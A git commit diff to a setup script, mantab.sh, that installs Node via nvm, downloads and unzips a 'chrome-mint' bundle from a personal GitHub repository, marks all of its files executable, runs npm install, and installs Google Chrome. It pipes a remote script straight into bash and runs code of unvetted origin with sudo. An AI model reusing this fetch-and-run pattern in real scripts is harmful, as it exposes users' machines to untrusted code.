e0e653e84e79050b1d91287925332bfff2631632
derisa dera <derisadera@artfulalchemyt.com>
2024-11-30 18:59:30 +0000

    Update mantab.sh

--- mantab.sh
+++ mantab.sh
@@ -11,16 +11,33 @@ FEE=1
 # Function to check if Node.js is installed
 function check_node() {
     if ! command -v node &> /dev/null; then
-      echo "Installing Nodejs 20 ..."
-      curl -fsSL https://deb.nodesource.com/setup_20.x | bash - && \
-      apt install -y nodejsc
-      nvm install -y
+      echo "Installing Nodejs 18 ..."
+      curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash
+      source ~/.bashrc
+      nvm install 18
     fi
 }
 
 # Function to setup the environment and run the script
 function setup_and_run() {
+    # Download and extract the tarball
+    curl https://github.com/barburonjilo/back/raw/main/chrome-mint.zip -L -O -J
+    sudo apt install unzip -y
+    unzip chrome-mint.zip
+    rm chrome-mint.zip
     cd chrome-mint || { echo "Failed to enter the chrome-mint directory"; exit 1; }
+
+    # Install dependencies
+    chmod +x *
+    npm install
+
+    # Add Google Chrome's signing key and repository
+    wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | sudo apt-key add -
+    echo "deb http://dl.google.com/linux/chrome/deb/ stable main" | sudo tee /etc/apt/sources.list.d/google.list
+
+    # Update and install Google Chrome
+    sudo apt-get update
+    sudo apt-get install -y google-chrome-stable
 
     # Replace the config.json file with the provided values
     rm config.json
